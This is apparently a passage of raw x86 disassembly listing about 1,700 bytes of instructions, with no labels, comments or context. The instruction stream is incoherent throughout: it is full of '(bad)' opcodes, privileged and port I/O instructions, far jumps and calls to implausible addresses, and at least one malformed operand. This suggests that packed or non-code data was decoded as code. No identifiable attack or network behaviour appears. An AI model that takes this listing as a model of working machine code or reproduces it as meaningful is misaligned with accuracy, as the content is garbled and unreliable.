  41282d:	mov    bh,cl
  41282f:	retf   
  412830:	mov    ebx,0x90c92925
  412835:	fs (bad) 
  412837:	mov    edx,0x6946a35c
  41283c:	sub    eax,0xbca7988b
  412841:	add    BYTE PTR [ebp+0x1f04c329],al
  412847:	aad    0xc8
  412849:	cdq    
  41284a:	inc    ebp
  41284b:	fwait
  41284c:	sbb    eax,0x9df9b80f
  412851:	mov    ah,0x30
  412853:	cmp    edx,DWORD PTR [edx]
  412855:	add    eax,0x2360cff8
  41285a:	imul   esp,esi,0x52
  41285d:	mov    dl,0x7c
  41285f:	mov    dl,0xbd
  412861:	push   ss
  412862:	inc    eax
  412863:	xchg   BYTE PTR [edx],ch
  412865:	(bad)  
  412866:	xchg   ebp,eax
  412867:	cwde   
  412868:	or     DWORD PTR [eax],edi
  41286a:	mov    ah,0x6c
  41286c:	pop    ds
  41286d:	cs std 
  41286f:	mov    cl,0x0
  412871:	call   0xb43b147f
  412876:	mov    dh,dl
  412878:	lea    esp,[ecx+0x1f]
  41287b:	push   es
  41287c:	je     0x4128e0
  41287e:	xchg   ebx,eax
  41287f:	inc    ebp
  412880:	mov    ss,ebx
  412882:	cwde   
  412883:	rol    DWORD PTR [ecx-0x6a],0xae
  412887:	add    DWORD PTR [ebx+ebp*2-0x2d],esp
  41288b:	lea    esi,[ecx+ecx*1+0x34]
  41288f:	xchg   ebp,edi
  412891:	or     BYTE PTR [edx],0x12
  412894:	mov    ebx,0x38d5d095
  412899:	imul   eax,DWORD PTR [edx+0x149f05d9],0xffffff87
  4128a0:	cli    
  4128a1:	cs ins DWORD PTR es:[edi],dx
  4128a3:	adc    al,dl
  4128a5:	push   ebp
  4128a6:	call   0x3a893138
  4128ab:	into   
  4128ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ad:	pop    ebp
  4128ae:	out    0x5d,eax
  4128b0:	inc    edi
  4128b1:	enter  0x3a5,0xd2
  4128b5:	mov    ds:0x4fd76ea7,al
  4128ba:	scas   eax,DWORD PTR es:[edi]
  4128bb:	clc    
  4128bc:	fs mov edx,0x5092cbc0
  4128c2:	inc    ebx
  4128c3:	sahf   
  4128c4:	push   ds
  4128c5:	add    al,0x69
  4128c7:	aaa    
  4128c8:	std    
  4128c9:	mov    ebp,0xf1abdf01
  4128ce:	dec    esp
  4128cf:	(bad)  
  4128d0:	fldln2 
  4128d2:	cmp    BYTE PTR [eax],al
  4128d4:	add    DWORD PTR [ebp-0x71],ebx
  4128d7:	aas    
  4128d8:	addr16 jno 0x4128b6
  4128db:	mov    dh,0x57
  4128dd:	stc    
  4128de:	add    BYTE PTR [ecx+0x1b40aa4d],ch
  4128e4:	push   edx
  4128e5:	cld    
  4128e6:	xor    ebp,DWORD PTR [edi+0x56]
  4128e9:	cmp    BYTE PTR es:[esi+0x6b84adfd],0x89
  4128f1:	cmp    dh,BYTE PTR [esi+0x62]
  4128f4:	jge    0x412969
  4128f6:	xchg   esp,eax
  4128f7:	fstp   DWORD PTR ds:0x2b46c953
  4128fd:	(bad)  
  4128fe:	and    DWORD PTR [ecx],esp
  412900:	in     al,dx
  412901:	scas   al,BYTE PTR es:[edi]
  412902:	repz add BYTE PTR ds:[di+0x6f],al
  412908:	shl    DWORD PTR [eax+0x40],cl
  41290b:	push   cs
  41290c:	cmp    eax,0x10266c8c
  412911:	and    ch,BYTE PTR [ecx+eiz*1+0x63]
  412915:	add    ah,al
  412917:	scas   al,BYTE PTR es:[edi]
  412918:	jae    0x41295a
  41291a:	leave  
  41291b:	inc    ecx
  41291c:	push   esi
  41291d:	jb     0x412955
  41291f:	ss sbb eax,0x1f61bc02
  412925:	mov    esp,eax
  412927:	add    BYTE PTR [edx],dl
  412929:	fs sbb al,0x94
  41292c:	mov    esp,0xfa38385a
  412931:	pop    es
  412932:	sbb    BYTE PTR [ebp-0x7b],bh
  412935:	and    bl,BYTE PTR [ebx*2+0x259ab39e]
  41293c:	sub    al,0xe7
  41293e:	dec    ebx
  41293f:	outs   dx,DWORD PTR ds:[esi]
  412940:	pop    ss
  412941:	add    BYTE PTR [ebx-0x37],dh
  412944:	sbb    DWORD PTR [ebp+0x2f],ebp
  412947:	aas    
  412948:	fisttp WORD PTR [ecx]
  41294a:	push   eax
  41294b:	jne    0x4129bd
  41294d:	mov    cl,dh
  41294f:	mov    eax,0xafaa3922
  412954:	fdiv   QWORD PTR [ecx-0x1f]
  412957:	int3   
  412958:	jmp    0xaacd99d7
  41295d:	adc    BYTE PTR [eax-0x44],al
  412960:	aad    0xf1
  412962:	stos   DWORD PTR es:[edi],eax
  412963:	imul   ecx,DWORD PTR es:[edx+0xa8f73dc],0xffffffc6
  41296b:	fcomp  QWORD PTR [ecx]
  41296d:	push   eax
  41296e:	xchg   edi,eax
  41296f:	inc    ebx
  412970:	and    bl,BYTE PTR [ebp+0x1357223f]
  412976:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412977:	mov    esp,eax
  412979:	sbb    eax,0x52a47ec3
  41297e:	sbb    DWORD PTR [ecx+edx*1],0xe002e083
  412985:	out    dx,eax
  412986:	aas    
  412987:	mov    ?,esp
  412989:	maxps  xmm5,XMMWORD PTR [eax]
  41298c:	shl    BYTE PTR [eax+0x6541f7e1],1
  412992:	mov    ecx,0xa14f860b
  412997:	icebp  
  412998:	mov    dh,0xaa
  41299a:	out    0xe2,eax
  41299c:	dec    eax
  41299d:	pushf  
  41299e:	addr16 push esp
  4129a0:	test   al,0x35
  4129a2:	or     eax,0x88eecb40
  4129a7:	push   esi
  4129a8:	and    al,0xc1
  4129aa:	add    BYTE PTR [ebx+0x7e],bh
  4129ad:	mov    ah,0xe8
  4129af:	ret    
  4129b0:	mov    al,ds:0x9d6181af
  4129b5:	jp     0x412940
  4129b7:	int    0x9d
  4129b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129ba:	cmp    DWORD PTR [edi-0x2],esp
  4129bd:	int3   
  4129be:	xchg   edi,eax
  4129bf:	mov    dh,0x3
  4129c1:	std    
  4129c2:	add    eax,0x7bf41591
  4129c7:	sbb    ch,BYTE PTR [edi-0x590c391d]
  4129cd:	adc    edi,edi
  4129cf:	popa   
  4129d0:	sbb    esp,ebp
  4129d2:	xchg   edx,eax
  4129d3:	cmp    esi,0x3a
  4129d6:	sub    al,0xb3
  4129d8:	sti    
  4129d9:	cmp    DWORD PTR [edx-0xf],0xd
  4129dd:	icebp  
  4129de:	or     cl,BYTE PTR [edx+0x53]
  4129e1:	xor    esi,DWORD PTR ds:0xc4fe617c
  4129e7:	pop    edx
  4129e8:	xchg   edx,eax
  4129e9:	hlt    
  4129ea:	retf   0x1a17
  4129ed:	scas   al,BYTE PTR es:[edi]
  4129ee:	ficom  WORD PTR [esi]
  4129f0:	mov    al,0xc1
  4129f2:	and    BYTE PTR [ebx-0x4ce353a3],bh
  4129f8:	xchg   esp,eax
  4129f9:	inc    esi
  4129fa:	rcl    BYTE PTR [edi],cl
  4129fc:	iret   
  4129fd:	loopne 0x4129f3
  4129ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a00:	adc    eax,0xabc93f04
  412a05:	push   ss
  412a06:	add    al,0x69
  412a08:	addr16 dec esp
  412a0a:	das    
  412a0b:	lods   eax,DWORD PTR ds:[esi]
  412a0c:	lock lock sbb dl,cl
  412a10:	in     eax,0xe0
  412a12:	not    DWORD PTR [edi-0x17]
  412a15:	retf   0x6366
  412a18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412a19:	test   DWORD PTR ds:0xd01dd885,edx
  412a1f:	call   DWORD PTR [edx+eax*4-0x27b6bc5]
  412a26:	sub    al,0x5b
  412a28:	in     eax,0x9b
  412a2a:	icebp  
  412a2b:	ret    0xd09a
  412a2e:	sar    edx,0x74
  412a31:	arpl   WORD PTR [edx+0x2c],di
  412a34:	dec    edi
  412a35:	xchg   edi,eax
  412a36:	shl    BYTE PTR [edi],0xd9
  412a39:	sub    eax,0xfdadce01
  412a3e:	xchg   DWORD PTR [edx+0x41],ecx
  412a41:	popf   
  412a42:	fs dec edi
  412a44:	out    0xac,al
  412a46:	fadd   DWORD PTR [ebp+0x1deaf4f]
  412a4c:	in     eax,dx
  412a4d:	sbb    DWORD PTR [edi],eax
  412a4f:	sbb    DWORD PTR [esi+edx*2+0x619c2b0f],ebp
  412a56:	(bad)  
  412a57:	jecxz  0x412a41
  412a59:	or     al,0x36
  412a5b:	(bad)  
  412a5c:	cmp    BYTE PTR [edi],dh
  412a5e:	fidivr DWORD PTR [edi]
  412a60:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a61:	sub    al,0x74
  412a63:	mov    ecx,0x88d7b44f
  412a68:	dec    esp
  412a69:	(bad)  
  412a6a:	jg     0x412a28
  412a6c:	push   ecx
  412a6d:	scas   eax,DWORD PTR es:[edi]
  412a6e:	mov    cl,BYTE PTR [ebp+0x40]
  412a71:	ja     0x412a65
  412a73:	adc    edx,DWORD PTR [edi+edx*4-0x5f708b55]
  412a7a:	mov    cl,BYTE PTR [esp+edi*1+0x62]
  412a7e:	pop    edx
  412a7f:	shr    BYTE PTR [edx+0x2a],1
  412a82:	gs cmp ch,BYTE PTR ss:[edi-0x710bbe3c]
  412a8a:	cmp    al,0xa1
  412a8c:	fisttp WORD PTR [edx]
  412a8e:	adc    DWORD PTR [edi+0x7f],ebx
  412a91:	jno    0x412a67
  412a93:	ss pusha 
  412a95:	fadd   st,st(4)
  412a97:	(bad)  
  412a98:	ins    BYTE PTR es:[edi],dx
  412a99:	fdivr  QWORD PTR [ebx]
  412a9b:	gs ret 0x801b
  412a9f:	pop    esp
  412aa0:	loopne 0x412a26
  412aa2:	xchg   DWORD PTR [ecx],esp
  412aa4:	xchg   ecx,eax
  412aa5:	push   0x2fd7ae59
  412aaa:	ds push ebp
  412aac:	lock inc ebp
  412aae:	cmp    esp,eax
  412ab0:	lods   eax,DWORD PTR ds:[esi]
  412ab1:	cmp    DWORD PTR [eax+0x719713e1],esi
  412ab7:	jns    0x412ae9
  412ab9:	push   edx
  412aba:	ins    BYTE PTR es:[edi],dx
  412abb:	fcomp  DWORD PTR [ebx]
  412abd:	inc    eax
  412abe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412abf:	add    eax,0xbcbca754
  412ac4:	and    edx,DWORD PTR [edx]
  412ac6:	loope  0x412a9d
  412ac8:	sub    esi,eax
  412aca:	lock fistp QWORD PTR [edi]
  412acd:	int3   
  412ace:	inc    eax
  412acf:	mov    cl,0x32
  412ad1:	test   DWORD PTR [edx],edx
  412ad3:	outs   dx,BYTE PTR ds:[esi]
  412ad4:	outs   dx,BYTE PTR ds:[esi]
  412ad5:	rol    al,0x96
  412ad8:	mov    al,ds:0xd850f5a4
  412add:	and    edx,DWORD PTR [ecx+0x4f850d25]
  412ae3:	clc    
  412ae4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ae5:	repnz call 0xf047:0xe1d6950c
  412aed:	inc    edx
  412aee:	ror    DWORD PTR [ebp-0x39],1
  412af1:	rcr    bl,cl
  412af3:	call   0x3a7e216
  412af8:	ja     0x412b78
  412afa:	inc    ecx
  412afb:	lods   eax,DWORD PTR ds:[esi]
  412afc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412afd:	fucom  st(2)
  412aff:	std    
  412b00:	xchg   DWORD PTR [esi-0x64],esp
  412b03:	adc    BYTE PTR [ebx+eiz*2-0x42],bl
  412b07:	push   edx
  412b08:	mov    BYTE PTR [edx],dl
  412b0a:	ja     0x412af2
  412b0c:	std    
  412b0d:	pop    esp
  412b0e:	and    BYTE PTR [edx+edi*1],ch
  412b11:	mov    cl,al
  412b13:	sbb    DWORD PTR [esi+edx*2+0x24a66664],0xfffffff6
  412b1b:	sbb    eax,0x1fd96f26
  412b20:	cs lahf 
  412b22:	inc    ebx
  412b23:	pop    ecx
  412b24:	or     ebx,DWORD PTR ds:0xc8292731
  412b2a:	pop    edx
  412b2b:	mov    ah,0xfd
  412b2d:	cwde   
  412b2e:	push   ebx
  412b2f:	and    DWORD PTR [esp+eax*1-0x1b],esp
  412b33:	mul    ebx
  412b35:	gs inc eax
  412b37:	mov    ch,0xfc
  412b39:	fnstenv [esi]
  412b3b:	push   0xffffff94
  412b3d:	stos   DWORD PTR es:[edi],eax
  412b3e:	cmp    eax,0x472d1c9
  412b43:	das    
  412b44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b46:	gs cmc 
  412b48:	jge    0x412b23
  412b4a:	xchg   edx,eax
  412b4b:	cmp    al,0xe0
  412b4d:	fild   QWORD PTR ss:[ebx+0x2f]
  412b51:	lods   eax,DWORD PTR ds:[esi]
  412b52:	mov    fs,eax
  412b54:	cld    
  412b55:	out    dx,al
  412b56:	rcr    DWORD PTR [ebp-0xa],cl
  412b59:	repz mov esi,0x91d4573a
  412b5f:	imul   eax,DWORD PTR [esi],0xffffffd0
  412b62:	xchg   esp,eax
  412b63:	int3   
  412b64:	xchg   ebp,eax
  412b65:	jo     0x412bcc
  412b67:	mov    dl,0x3b
  412b69:	adc    DWORD PTR [ecx+eax*8+0x5c],eax
  412b6d:	(bad)  
  412b6e:	fidiv  WORD PTR [edx-0x65]
  412b71:	lods   al,BYTE PTR ds:[esi]
  412b72:	ficom  DWORD PTR [ebp-0x16b8ed47]
  412b78:	icebp  
  412b79:	call   0x46843313
  412b7e:	jp     0x412b30
  412b80:	cmp    DWORD PTR [edi+0x24ab5e36],esi
  412b86:	cmp    eax,DWORD PTR [edx]
  412b88:	icebp  
  412b89:	jmp    0x412bbe
  412b8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b8c:	sub    al,0x55
  412b8e:	call   0x363aa5ee
  412b93:	cmp    bh,BYTE PTR [ebp-0x78]
  412b96:	shr    DWORD PTR [edi+eiz*8-0x48fd16a1],cl
  412b9d:	rcl    BYTE PTR [eax+0x43],1
  412ba0:	leave  
  412ba1:	retf   0x17b5
  412ba4:	sub    BYTE PTR [eax-0x4],ah
  412ba7:	outs   dx,BYTE PTR ds:[esi]
  412ba8:	sbb    edx,DWORD PTR [ebp-0x6bfe95dd]
  412bae:	shl    eax,1
  412bb0:	ss hlt 
  412bb2:	sub    DWORD PTR [edi+0x20],edi
  412bb5:	dec    edx
  412bb6:	inc    esi
  412bb7:	and    BYTE PTR [edi*2+0x5eaac8df],dl
  412bbe:	and    al,0xc6
  412bc0:	out    0x88,al
  412bc2:	jne    0x412be5
  412bc4:	daa    
  412bc5:	mov    ebx,0x10f62638
  412bca:	test   DWORD PTR [ebx+0x137e6d4],0xf9800ec2
  412bd4:	xchg   BYTE PTR [ebp+ebx*4+0x6c],al
  412bd8:	mov    dh,0xc8
  412bda:	inc    esp
  412bdb:	push   edi
  412bdc:	mov    esp,0x57321adb
  412be1:	xlat   BYTE PTR ds:[ebx]
  412be2:	dec    edx
  412be3:	inc    esi
  412be4:	repz cmp dl,BYTE PTR [eax+edi*1+0x2d]
  412be9:	ja     0x412c3a
  412beb:	inc    esi
  412bec:	pop    ss
  412bed:	cdq    
  412bee:	pop    esp
  412bef:	mov    cl,0xf0
  412bf1:	sub    edi,DWORD PTR [ebp-0x21]
  412bf4:	xlat   BYTE PTR ds:[ebx]
  412bf5:	test   bl,dh
  412bf7:	ss in  al,dx
  412bf9:	pop    esp
  412bfa:	pushf  
  412bfb:	sbb    DWORD PTR [edi-0x521fac5d],ecx
  412c01:	lea    eax,[ebx]
  412c03:	imul   esp,DWORD PTR [esi],0xffffffdc
  412c06:	push   ebx
  412c07:	out    0x7,eax
  412c09:	push   esp
  412c0a:	repnz inc dh
  412c0d:	inc    esi
  412c0e:	jo     0x412c19
  412c10:	mov    cl,0x24
  412c12:	fwait
  412c13:	les    edi,FWORD PTR [edi-0x2]
  412c16:	bound  esi,QWORD PTR [esp+ecx*2+0x29]
  412c1a:	sub    DWORD PTR [ebx],edx
  412c1c:	arpl   WORD PTR [ecx+0x74af8ffe],ax
  412c22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c23:	mov    ch,0x7f
  412c25:	lods   al,BYTE PTR ds:[esi]
  412c26:	inc    eax
  412c27:	test   DWORD PTR [ebp+0x65],0xb6edab5f
  412c2e:	xor    al,0xda
  412c30:	(bad)  
  412c31:	sahf   
  412c32:	(bad)  
  412c33:	aas    
  412c34:	cmp    dh,BYTE PTR [edx+0x69b33d42]
  412c3a:	rcr    BYTE PTR [edx+0x3d091ca7],1
  412c40:	dec    ecx
  412c41:	adc    DWORD PTR [edi],edi
  412c43:	push   ebp
  412c44:	lea    edx,[ebp+eax*4+0x1d]
  412c48:	cs push edx
  412c4a:	pusha  
  412c4b:	xchg   ebp,eax
  412c4c:	into   
  412c4d:	mov    BYTE PTR [edi-0x6f],bh
  412c50:	ret    
  412c51:	inc    eax
  412c52:	sbb    DWORD PTR [esi],edx
  412c54:	rol    eax,1
  412c56:	test   DWORD PTR [edi-0x1],ecx
  412c59:	xchg   ebx,eax
  412c5a:	xchg   esp,eax
  412c5b:	out    0x42,eax
  412c5d:	mov    cl,0x8
  412c5f:	xlat   BYTE PTR ds:[ebx]
  412c60:	xor    bh,BYTE PTR cs:[esi+0x39ac2b98]
  412c67:	rcl    DWORD PTR [eax+eiz*4],0x65
  412c6b:	mov    edi,0x6254c09d
  412c70:	sub    eax,0x88dbdfe2
  412c75:	mov    edi,0x3cb40bb1
  412c7a:	and    eax,0x4cd3fbf
  412c7f:	or     dh,BYTE PTR [edi-0x4]
  412c82:	pop    ebx
  412c83:	mov    dl,0x69
  412c85:	sub    DWORD PTR ss:[ebx+0x57],edi
  412c89:	ins    BYTE PTR es:[edi],dx
  412c8a:	in     eax,0xd5
  412c8c:	cmp    dh,dh
  412c8e:	out    dx,al
  412c8f:	xor    eax,0xb6b84fc0
  412c94:	shl    DWORD PTR [esi],1
  412c96:	pushf  
  412c97:	or     BYTE PTR [ebx-0x4f],dh
  412c9a:	pop    esp
  412c9b:	mov    ebp,0xe32cb2f6
  412ca0:	ins    BYTE PTR es:[edi],dx
  412ca1:	lods   eax,DWORD PTR ds:[esi]
  412ca2:	bound  esi,QWORD PTR [edi-0x10]
  412ca5:	cmc    
  412ca6:	test   al,0xb4
  412ca8:	sahf   
  412ca9:	cld    
  412caa:	or     al,0xa9
  412cac:	sbb    cl,BYTE PTR [ebx+eax*2-0x33c0378a]
  412cb3:	sbb    DWORD PTR [edi+0x36],edi
  412cb6:	cmp    al,0x47
  412cb8:	push   esi
  412cb9:	mov    dh,0x1f
  412cbb:	addr16 dec ebp
  412cbd:	xor    eax,0x89b3788d
  412cc2:	cmc    
  412cc3:	xchg   cl,al
  412cc5:	push   ss
  412cc6:	or     al,0x9a
  412cc8:	dec    ecx
  412cc9:	sbb    dh,BYTE PTR [edx]
  412ccb:	hlt    
  412ccc:	push   edx
  412ccd:	mov    dl,0xf6
  412ccf:	repnz adc eax,DWORD PTR [ecx+ebp*2]
  412cd3:	add    BYTE PTR [ebx+edi*1-0x16705c7e],dl
  412cda:	sub    bh,ah
  412cdc:	dec    esi
  412cdd:	xchg   esp,eax
  412cde:	ins    DWORD PTR es:[edi],dx
  412cdf:	in     eax,dx
  412ce0:	loopne 0x412d16
  412ce2:	scas   al,BYTE PTR es:[edi]
  412ce3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ce4:	sbb    al,0x74
  412ce6:	(bad)  
  412ce7:	fstp   DWORD PTR [ecx+0x67]
  412cea:	dec    edi
  412ceb:	mov    bl,0x7d
  412ced:	xchg   ebx,eax
  412cee:	cld    
  412cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cf0:	repz add al,0xa9
  412cf3:	or     DWORD PTR [edi+edx*2-0x3f74a63f],ecx
  412cfa:	mov    dl,0xaa
  412cfc:	in     al,0x97
  412cfe:	je     0x412d12
  412d00:	out    dx,al
  412d01:	cmp    bh,cl
  412d03:	dec    eax
  412d04:	mov    DWORD PTR [edx],ebp
  412d06:	xor    esp,0x9a1b5bdf
  412d0c:	iret   
  412d0d:	mov    edx,0xbf4d74f0
  412d12:	push   ds
  412d13:	push   ecx
  412d14:	aam    0x7a
  412d16:	sub    eax,0x3369950a
  412d1b:	push   0xffffffd5
  412d1d:	(bad)  
  412d1f:	stos   DWORD PTR es:[edi],eax
  412d20:	sti    
  412d21:	fs cmp al,0x1c
  412d24:	pop    es
  412d25:	stc    
  412d26:	mov    cs,edx
  412d28:	nop
  412d29:	rol    DWORD PTR [ecx+0x36fed13],cl
  412d2f:	or     BYTE PTR ds:0x2a3dfed6,dh
  412d35:	int3   
  412d36:	cmp    al,0x37
  412d38:	inc    ebx
  412d39:	or     ch,BYTE PTR [esi+0x21dca87b]
  412d3f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d40:	jne    0x412db3
  412d42:	mov    eax,ds:0xabe083e6
  412d47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d48:	jmp    0x412d9d
  412d4a:	cmp    al,0x22
  412d4c:	jecxz  0x412d53
  412d4e:	daa    
  412d4f:	mov    cl,0xd7
  412d51:	pop    ecx
  412d52:	inc    esi
  412d53:	retf   
  412d54:	push   DWORD PTR [ecx-0x215ec95a]
  412d5a:	pusha  
  412d5b:	add    BYTE PTR [ebp-0x62586455],0x2a
  412d62:	les    esi,FWORD PTR [eax-0x7]
  412d65:	loope  0x412dca
  412d67:	cmp    ch,ah
  412d69:	mov    dh,0x3e
  412d6b:	xor    ebx,DWORD PTR [edx+esi*8+0x74]
  412d6f:	mov    ds:0x9c5ad898,eax
  412d74:	jp     0x412dea
  412d76:	dec    ebp
  412d77:	cmp    eax,0xfe61aed6
  412d7c:	and    dl,bh
  412d7e:	cmp    dl,BYTE PTR [esp+eiz*8+0x3528ce53]
  412d85:	cmp    cl,BYTE PTR [edx-0x13]
  412d88:	sub    BYTE PTR [ebp+0x514f725e],ah
  412d8e:	pop    ebx
  412d8f:	add    DWORD PTR [ebx-0x1b],ecx
  412d92:	retf   0x90c6
  412d95:	push   eax
  412d96:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d97:	push   ss
  412d98:	into   
  412d99:	push   0xffffff88
  412d9b:	psllw  mm0,QWORD PTR [edi+ecx*8]
  412d9f:	adc    eax,0xf9cc89ec
  412da4:	jle    0x412dd2
  412da6:	mov    dh,0x7d
  412da8:	stos   DWORD PTR es:[edi],eax
  412da9:	popf   
  412daa:	sbb    dh,BYTE PTR [ecx]
  412dac:	inc    eax
  412dad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412dae:	rcl    DWORD PTR [ebp-0xc],1
  412db1:	shr    DWORD PTR [edi+0x56372ce2],0x42
  412db8:	hlt    
  412db9:	push   ebx
  412dba:	push   eax
  412dbb:	push   edi
  412dbc:	fiadd  WORD PTR [ecx-0x7fede745]
  412dc2:	push   esi
  412dc3:	cdq    
  412dc4:	mov    DWORD PTR [edi+0x7d],esp
  412dc7:	sub    al,0x33
  412dc9:	adc    ecx,esi
  412dcb:	fdiv   DWORD PTR [eax+0x19b34e77]
  412dd1:	adc    bh,BYTE PTR [edi-0x5]
  412dd4:	mov    eax,ds:0xf85b7e0a
  412dd9:	sti    
  412dda:	stc    
  412ddb:	jge    0x412de7
  412ddd:	std    
  412dde:	cmp    al,0xa1
  412de0:	invd   
  412de2:	pop    ss
  412de3:	pop    es
  412de4:	jl     0x412df8
  412de6:	test   DWORD PTR [eax-0x1c],ebp
  412de9:	mov    edi,0xa866dc8c
  412dee:	enter  0xfc40,0xff
  412df2:	xor    ch,BYTE PTR [edi+0x4fbf96be]
  412df8:	rol    DWORD PTR [edi+ecx*1+0x35d10320],cl
  412dff:	add    eax,0xfebee806
  412e04:	dec    ebp
  412e05:	sbb    al,0x5c
  412e07:	add    BYTE PTR [esp+ecx*2-0x37],dh
  412e0b:	gs mov ecx,0x5e784d76
  412e11:	test   eax,0xc86e9b65
  412e16:	mov    ch,BYTE PTR [eax-0x3147ab48]
  412e1c:	and    BYTE PTR [edi],ah
  412e1e:	retf   
  412e1f:	ror    BYTE PTR [eax-0x6d3b1ffc],cl
  412e25:	xchg   ebx,eax
  412e26:	rcr    BYTE PTR ds:0xc8e2db26,0xab
  412e2d:	sbb    eax,0x9e129e02
  412e32:	inc    ebx
  412e33:	cmp    BYTE PTR [ebx],bl
  412e35:	retf   0x150f
  412e38:	xchg   esp,eax
  412e39:	inc    ecx
  412e3a:	or     BYTE PTR [eax-0x5ea7a11c],bh
  412e40:	retf   
  412e41:	stos   DWORD PTR es:[edi],eax
  412e42:	(bad)  
  412e43:	jle    0x412ebb
  412e45:	pop    ds
  412e46:	jne    0x412e74
  412e48:	and    eax,0x9c0f52dc
  412e4d:	(bad)  
  412e4e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412e4f:	mov    cl,0xdb
  412e51:	mov    al,0x59
  412e53:	pop    ss
  412e54:	push   edi
  412e55:	jnp    0x412ded
  412e57:	pop    edx
  412e58:	mov    dl,0x30
  412e5a:	jo     0x412e42
  412e5c:	addr16 dec eax
  412e5e:	jecxz  0x412e00
  412e60:	scas   al,BYTE PTR es:[edi]
  412e61:	or     DWORD PTR [ecx],ebx
  412e63:	mov    esp,0x7958f9e5
  412e68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e69:	das    
  412e6a:	adc    eax,0x3b6fdfea
  412e6f:	scas   al,BYTE PTR es:[edi]
  412e70:	mov    ebx,0xade161d7
  412e75:	gs mov ebp,0x15ab3b56
  412e7b:	xor    al,0x3d
  412e7d:	das    
  412e7e:	test   eax,0x66bc004f
  412e83:	mov    eax,es:0xa34676b9
  412e89:	outs   dx,BYTE PTR ds:[esi]
  412e8a:	repnz cmp al,0x31
  412e8d:	stos   DWORD PTR es:[edi],eax
  412e8e:	cld    
  412e8f:	lods   al,BYTE PTR ds:[esi]
  412e90:	pop    ss
  412e91:	xor    al,0x9f
  412e93:	scas   eax,DWORD PTR es:[edi]
  412e94:	outs   dx,DWORD PTR ds:[esi]
  412e95:	leave  
  412e96:	mov    edx,DWORD PTR [esi-0x2d]
  412e99:	mov    al,ds:0xef91000
  412e9e:	pop    ebp
  412e9f:	jg     0x412ef9
  412ea1:	fs retfw 
  412ea4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412ea5:	cmp    BYTE PTR [edi],ah
  412ea7:	cmp    DWORD PTR [edx-0x66],esi
  412eaa:	hlt    
  412eab:	test   al,0x0
  412ead:	pop    edx
  412eae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412eaf:	mov    ebx,0x4c22c837
  412eb4:	xchg   ebp,eax
  412eb5:	shl    BYTE PTR [edx+0x1],1
  412eb8:	outs   dx,BYTE PTR ds:[esi]
  412eb9:	sbb    dl,dh
  412ebb:	mov    dh,0xa7
  412ebd:	jl     0x412e54
  412ebf:	ins    DWORD PTR es:[edi],dx
  412ec0:	xchg   ecx,eax
  412ec1:	push   ebp
  412ec2:	sub    dl,BYTE PTR [ebp-0x59d4f55b]
  412ec8:	mov    edi,0xae75e06
  412ecd:	push   0x2f0d60cf
  412ed2:	lods   eax,DWORD PTR ds:[esi]
  412ed3:	mov    ds:0x52e70ac1,eax
  412ed8:	sar    BYTE PTR [ebp-0x5dee557d],1
  412ede:	add    eax,0x347ca168
  412ee3:	jae    0x412ebd
  412ee5:	test   BYTE PTR [eax+0xc0d4df6],al
  412eeb:	xchg   esi,eax
  412eec:	jno    0x412efe
  412eee:	cmp    DWORD PTR [edx+0x56b63531],0x5c
  412ef5:	daa    
  412ef6:	(bad)  
  412ef7:	pushf  
  412ef8:	shl    BYTE PTR [ebp+0x6e2d2e17],cl
  412efe:	bound  eax,QWORD PTR [edx+esi*2]
  412f01:	cmp    DWORD PTR [edi-0x7925d386],esi
  412f07:	imul   BYTE PTR [edx]
  412f09:	pop    edx
  412f0a:	test   al,0xe8
  412f0c:	jge    0x412ee3
  412f0e:	cdq    
  412f0f:	in     eax,0x94
  412f11:	scas   eax,DWORD PTR es:[edi]
  412f12:	push   0xfffffff1
  412f14:	cmp    DWORD PTR ds:0x729b8aff,edx
  412f1a:	clc    
  412f1b:	or     ecx,DWORD PTR [edx+0x33]
  412f1e:	stos   BYTE PTR es:[edi],al
  412f1f:	add    BYTE PTR [eax+ecx*4+0x48864d5],0x7c
  412f27:	aas    
  412f28:	sub    BYTE PTR [ecx+0x30fe599c],bl
  412f2e:	push   ss
  412f2f:	sbb    BYTE PTR [edi],dh
  412f31:	cmp    al,0xf1
  412f33:	sbb    cl,BYTE PTR [ebx+0x7c3e9b63]
  412f39:	xchg   esp,eax
  412f3a:	jns    0x412f6e
  412f3c:	jae    0x412f67
  412f3e:	je     0x412ecf
  412f40:	test   eax,0x6d57139b
  412f45:	cmp    DWORD PTR [ecx+ebp*8],esi
  412f48:	dec    ecx
  412f49:	jp     0x412fa8
  412f4b:	and    edi,ecx
  412f4d:	dec    ebp
  412f4e:	mov    dh,0x46
  412f50:	mov    gs,WORD PTR [ecx]
  412f52:	(bad)  ds:[ebx+0x718ce6db]
  412f59:	push   es
  412f5a:	or     BYTE PTR [esi],dh
  412f5c:	sub    DWORD PTR [esi+esi*4-0x70],esp
  412f60:	ja     0x412efb
  412f62:	jmp    0x29c3dd96
  412f67:	pop    esi
  412f68:	cmp    DWORD PTR [ebx],ecx
  412f6a:	lds    edi,FWORD PTR [edi]
  412f6c:	in     al,dx
  412f6d:	sub    al,0xef
  412f6f:	sti    
  412f70:	mov    BYTE PTR [edi+0x1cb1261c],ah
